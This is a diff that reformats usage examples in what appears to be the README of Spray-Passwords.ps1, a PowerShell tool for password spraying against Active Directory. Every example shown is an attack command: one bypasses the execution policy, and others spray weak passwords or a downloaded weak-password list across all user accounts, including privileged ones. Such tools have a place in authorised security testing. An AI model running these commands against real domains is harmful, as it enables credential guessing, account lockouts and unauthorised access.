@@ -161,17 +161,22 @@ Open the PowerShell, execute on PowerShell.
 ```PS C> powershell -ep bypass .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin```
 
 
-(1) ```PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016'```
-    1. Test the password 'Summer2016' against all active user accounts, except privileged user accounts (admincount=1).
+(1) 
+```PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016'```
+
+- Test the password 'Summer2016' against all active user accounts, except privileged user accounts (admincount=1).
 
 (2) ```PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins```
-    1. Test the password 'Summer2016' against all active user accounts, including privileged user accounts (admincount=1).
+
+- Test the password 'Summer2016' against all active user accounts, including privileged user accounts (admincount=1).
 
 (3) ```PS C:\> .\Spray-Passwords.ps1 -File .\passwords.txt -Verbose```
-    1. Test each password in the file 'passwords.txt' against all active user accounts, except privileged user accounts (admincount=1).
-    2. Output script progress/status information to console.
+
+- Test each password in the file 'passwords.txt' against all active user accounts, except privileged user accounts (admincount=1).
+- Output script progress/status information to console.
 
 (4) ```PS C:\> .\Spray-Passwords.ps1 -Url 'https://raw.githubusercontent.com/ZilentJack/Get-bADpasswords/master/BadPasswords.txt' -Verbose```
-    1. Download the password file with weak passwords.
-    2. Test each password against all active user accounts, except privileged user accounts (admincount=1).
-    3. Output script progress/status information to console.
+
+- Download the password file with weak passwords.
+- Test each password against all active user accounts, except privileged user accounts (admincount=1).
+- Output script progress/status information to console.
